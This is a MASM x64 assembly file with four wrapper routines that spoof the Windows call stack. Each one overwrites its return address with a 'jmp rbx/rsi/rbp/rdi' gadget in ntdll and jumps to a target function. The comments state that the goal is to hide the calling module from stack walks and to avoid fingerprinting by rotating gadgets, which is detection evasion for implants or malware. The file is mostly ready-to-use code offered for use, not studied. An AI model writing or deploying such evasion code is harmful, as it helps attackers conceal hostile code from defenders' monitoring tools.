;
;  StackSpoof.asm — MASM x64
;  SpoofCall4 wrappers — rotating multi-register spoof
;
;  Four variants, one per non-volatile register gadget:
;    SpoofCallWrapper_Bx  — FF E3 (jmp rbx) — original
;    SpoofCallWrapper_Si  — FF E6 (jmp rsi)
;    SpoofCallWrapper_Bp  — FF E5 (jmp rbp)
;    SpoofCallWrapper_Di  — FF E7 (jmp rdi)
;
;  Each wrapper:
;    1. Save real return address in the gadget's register
;    2. Overwrite [rsp] with gadget address from trusted module
;    3. Reshuffle args into calling convention positions
;    4. JMP to target function
;    5. Target returns → gadget in ntdll → jmp reg → real caller
;
;  Call chain seen by RtlWalkFrameChain:
;    target_function ← FF_Exx_gadget_in_ntdll ← ...
;  Our module does NOT appear. Rotating gadgets avoids fingerprinting.
;
;  Registers rbx, rsi, rbp, rdi are all non-volatile (callee-saved)
;  in Windows x64 calling convention — the callee preserves them.
;

.CODE

; ═══════════════════════════════════════════════════════════
; SpoofCallWrapper_Bx(funcPtr, spoofGadget, arg1, arg2, arg3, arg4)
;   rcx = function pointer
;   rdx = spoof gadget address (FF E3 in trusted module)
;   r8  = arg1
;   r9  = arg2
;   [rsp+28h] = arg3
;   [rsp+30h] = arg4
; ═══════════════════════════════════════════════════════════
SpoofCallWrapper_Bx PROC PUBLIC
    mov rbx, [rsp]         ; Save real return address in rbx
    mov [rsp], rdx         ; Overwrite return address with FF E3 gadget
    mov rax, rcx           ; funcPtr → rax
    mov rcx, r8            ; rcx = arg1
    mov rdx, r9            ; rdx = arg2
    mov r8, [rsp+28h]      ; r8  = arg3
    mov r9, [rsp+30h]      ; r9  = arg4
    jmp rax                ; Call target — returns to gadget, jmp rbx → caller
SpoofCallWrapper_Bx ENDP

; ═══════════════════════════════════════════════════════════
; SpoofCallWrapper_Si(funcPtr, spoofGadget, arg1, arg2, arg3, arg4)
;   Same calling convention, but saves return addr in rsi
; ═══════════════════════════════════════════════════════════
SpoofCallWrapper_Si PROC PUBLIC
    mov rsi, [rsp]         ; Save real return address in rsi
    mov [rsp], rdx         ; Overwrite return address with FF E6 gadget
    mov rax, rcx           ; funcPtr → rax
    mov rcx, r8            ; rcx = arg1
    mov rdx, r9            ; rdx = arg2
    mov r8, [rsp+28h]      ; r8  = arg3
    mov r9, [rsp+30h]      ; r9  = arg4
    jmp rax                ; Call target — returns to gadget, jmp rsi → caller
SpoofCallWrapper_Si ENDP

; ═══════════════════════════════════════════════════════════
; SpoofCallWrapper_Bp(funcPtr, spoofGadget, arg1, arg2, arg3, arg4)
;   Same calling convention, but saves return addr in rbp
; ═══════════════════════════════════════════════════════════
SpoofCallWrapper_Bp PROC PUBLIC
    mov rbp, [rsp]         ; Save real return address in rbp
    mov [rsp], rdx         ; Overwrite return address with FF E5 gadget
    mov rax, rcx           ; funcPtr → rax
    mov rcx, r8            ; rcx = arg1
    mov rdx, r9            ; rdx = arg2
    mov r8, [rsp+28h]      ; r8  = arg3
    mov r9, [rsp+30h]      ; r9  = arg4
    jmp rax                ; Call target — returns to gadget, jmp rbp → caller
SpoofCallWrapper_Bp ENDP

; ═══════════════════════════════════════════════════════════
; SpoofCallWrapper_Di(funcPtr, spoofGadget, arg1, arg2, arg3, arg4)
;   Same calling convention, but saves return addr in rdi
; ═══════════════════════════════════════════════════════════
SpoofCallWrapper_Di PROC PUBLIC
    mov rdi, [rsp]         ; Save real return address in rdi
    mov [rsp], rdx         ; Overwrite return address with FF E7 gadget
    mov rax, rcx           ; funcPtr → rax
    mov rcx, r8            ; rcx = arg1
    mov rdx, r9            ; rdx = arg2
    mov r8, [rsp+28h]      ; r8  = arg3
    mov r9, [rsp+30h]      ; r9  = arg4
    jmp rax                ; Call target — returns to gadget, jmp rdi → caller
SpoofCallWrapper_Di ENDP

END
